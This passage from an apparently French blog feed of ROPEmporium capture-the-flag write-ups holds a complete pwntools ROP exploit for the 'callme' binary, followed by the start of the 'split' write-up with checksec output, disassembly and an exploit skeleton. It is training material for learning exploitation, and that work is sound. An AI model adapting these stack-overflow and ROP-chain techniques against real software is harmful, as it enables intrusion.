</span></span></code></pre></div><h2 id="final-payload">Final Payload</h2>
<p>Complétons notre exploit avec ce ret:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./callme&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00000000004006be</span>)
</span></span><span style="display:flex;"><span>pop_rdi_rsi_rdx <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040093c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>callme_one <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400720</span>)
</span></span><span style="display:flex;"><span>callme_two <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400740</span>)
</span></span><span style="display:flex;"><span>callme_three <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006f0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>)
</span></span><span style="display:flex;"><span>arg3 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ret gadget</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met les arguments dans les registres, puis on jump à la fonction callme_one</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_one
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pareil, on remet les arguments dans les registres et cette fois on jump à callme_two</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_two
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_three
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Et cette fois, il devrait fonctionner:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212548977-7d83ef59-bf5a-497e-b655-9011e98b84d5.png" alt="2023-01-15-153142_994x552_scrot"></p>
<p>Parfait, on a réussi à récupérer le flag</p>
<blockquote>
<p>Note: Nous ne sommes pas en x86_x64 donc nous n&rsquo;aurions pas dû avoir besoin de doubler les valeurs des arguments comme dit dans la consigne mais ça ne fonctionnait pas sans&hellip;</p>
</blockquote>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - split (x64)</title>
            <link>/posts/2023/01/ropemporium-split-x64/</link>
            <pubDate>Sun, 01 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/ropemporium-split-x64/</guid>
            <description>Note Deuxième exercice de ROPEmporium, un tout petit peu plus complexe que le précédent mais il reste très accessible. Je vais essayer une fois de plus d&amp;rsquo;expliquer le plus clairement possible ce que j&amp;rsquo;ai fait pour le réussir. Si j&amp;rsquo;ai fait des erreurs, n&amp;rsquo;hésitez pas à me contacter sur discord pour me le dire.
Si vous ne comprenez pas quelque chose, je vous invite à regarder la série dans l&amp;rsquo;ordre.</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Deuxième exercice de ROPEmporium, un tout petit peu plus complexe que le précédent mais il reste très accessible. Je vais essayer une fois de plus d&rsquo;expliquer le plus clairement possible ce que j&rsquo;ai fait pour le réussir. Si j&rsquo;ai fait des erreurs, n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="../../../../series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
<h2 id="file-information">File information</h2>
<p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">split</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">split</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">98755e64e1d0c1bff48fccae1dca9ee9e3c609e2</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé</p>
<p>Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/split_x64/split&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Cette fois-ci, <strong>NX</strong> est activé, ce qui veut dire qu&rsquo;on ne pourra pas utiliser de shellcode.</p>
<h2 id="exploitation">Exploitation</h2>
<p>On va run l&rsquo;executable et voir ce qu&rsquo;il se passe</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212481259-21f15103-f1f5-4ce5-a4e6-5a89b7f34acf.png" alt="2023-01-14-140834_657x666_scrot"></p>
<p>Contrairement au précédent, il ne nous donne aucune information sur son fonctionnement. En revanche, on voit que si on entre un nombre de bytes élevé dans l&rsquo;input, il  <code>segfault</code>, ce qui veut dire qu&rsquo;on a commencé à réecrire la sauvegarde de <code>rip</code></p>
<p>C&rsquo;est bon signe, on a déjà trouvé notre point d&rsquo;entrée. On va maintenant désassembler l&rsquo;executable avec <code>pwndbg</code> pour essayer de comprendre plus en détail ce qu&rsquo;il fait</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400697</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400698</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2009d6</span>]        <span style="color:#75715e"># 0x601078 &lt;stdout@@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:  mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006ac</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006b4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4005a0</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006b9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">34</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4007e8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006be</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006c3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4007fe</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006c8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006cd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006e8</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400806</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006dc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:  pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:  ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>On voit que le main fait appel à une fonction appelée <code>pwnme</code>, on va la désassembler elle aussi et voir ce qu&rsquo;elle fait</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006ec</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006f0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006f4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006f9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">22</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400701</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400580</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400706</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400810</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040070b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400710</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x40083c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400715</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040071a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">50</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400570</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040071f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400723</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x60</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400728</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040072b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400730</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400590</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400735</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x40083f</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040073a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040073f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:  nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400740</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">88</span><span style="color:#f92672">&gt;</span>:  leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400741</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;</span>:  ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>On peut voir qu&rsquo;il lit 96 (0x60) bytes d&rsquo;input via la fonction <code>read()</code>, et qu&rsquo;il les stocke dans un buffer de 32 (0x20) bytes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040071f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400723</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x60</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400728</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040072b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400730</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400590</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>Voici donc à quoi va ressembler le début de notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./split&#39;</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(padding <span style="color:#f92672">+</span> rbp)
</span></span></code></pre></div><p>Evidemment, cet exploit ne fait rien, mais nous savons déjà quelle taille notre padding va faire, et on peut à présent réecrire la sauvegarde de <code>rip</code>. La prochaine étape est de savoir quoi mettre dans ce registre, on va commencer par chercher si il y a des fonctions intéressantes (toujours avec <code>pwndbg</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400528</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400550</span>  puts<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400560</span>  system<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400570</span>  printf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400580</span>  memset<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400590</span>  read<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005a0</span>  setvbuf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005b0</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e0</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005f0</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400620</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400660</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400690</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400697</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006e8</span>  pwnme
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400742</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400760</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007d0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007d4</span>  _fini
</span></span></code></pre></div><p>On voit une fonction <code>usefulFunction</code> située à <code>0x00400742</code>. Voyons ce qu&rsquo;elle fait en la désassemblant:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass usefulFunction
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function usefulFunction:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400742</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400743</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
